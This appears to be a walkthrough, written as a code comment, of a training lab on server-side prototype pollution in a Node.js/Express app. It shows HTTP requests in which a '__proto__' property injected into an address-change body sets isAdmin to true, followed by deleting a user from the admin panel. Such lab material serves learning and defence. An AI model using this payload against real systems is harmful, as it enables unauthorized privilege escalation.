/*

This lab is built on Node.js and the Express framework. 
It unsafely merges user-controlled input into a server-side JavaScript object. 
Any polluted properties inherited via the prototype chain are visible in an HTTP response.


a) Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
b) Identify a gadget property that you can use to escalate your privileges.
c) Access the admin panel and delete the user carlos.

You can log in to your own account with the following credentials: wiener:peter 


1) POST /my-account/change-address HTTP/2 
// request
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"5JzVDJLTVnuUyvFwmlNoMAjYrm3Mt19N"
}

// response

{
    "username":"wiener",
    "firstname":"Peter",
    "lastname":"Wiener",
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "isAdmin":false
}
// send to repeater

3)  POST /my-account/change-address HTTP/2 
// request
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"5JzVDJLTVnuUyvFwmlNoMAjYrm3Mt19N",
    "__proto__":{
     "isAdmin":"bar"
    }}

// response
{
    "username":"wiener",
    "firstname":"Peter",
    "lastname":"Wiener",
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "isAdmin":true
}

4) Since server side prototype pollution persists, refresh the page and delete the carlos    
*/